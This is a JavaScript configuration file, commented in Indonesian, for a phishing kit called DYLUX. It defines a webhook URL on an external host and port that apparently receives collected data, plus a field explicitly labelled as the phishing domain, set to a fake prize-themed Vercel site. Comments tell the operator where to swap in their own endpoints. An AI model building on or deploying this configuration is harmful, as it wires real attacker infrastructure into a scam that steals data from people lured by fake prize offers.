// ============================================
// DYLUX - KONFIGURASI PUSAT
// ============================================

const DYLUX_CONFIG = {
    // ==========================================
    // WEBHOOK URL - GANTI DI SINI AJA!
    // ==========================================
    WEBHOOK_URL: 'http://host-kazzah.zaxiyent.my.id:2001/api/webhook',
    
    // ==========================================
    // DOMAIN WEB PHISING - GANTI DI SINI JUGA!
    // ==========================================
    PHISHING_DOMAIN: 'https://dyluxx-berhadiah.vercel.app',
    
    // ==========================================
    // KONFIGURASI LAIN
    // ==========================================
    APP_NAME: 'DYLUX',
    VERSION: '1.0.0'
};

// Export biar bisa dipake di file lain
if (typeof module !== 'undefined' && module.exports) {
    module.exports = DYLUX_CONFIG;
}
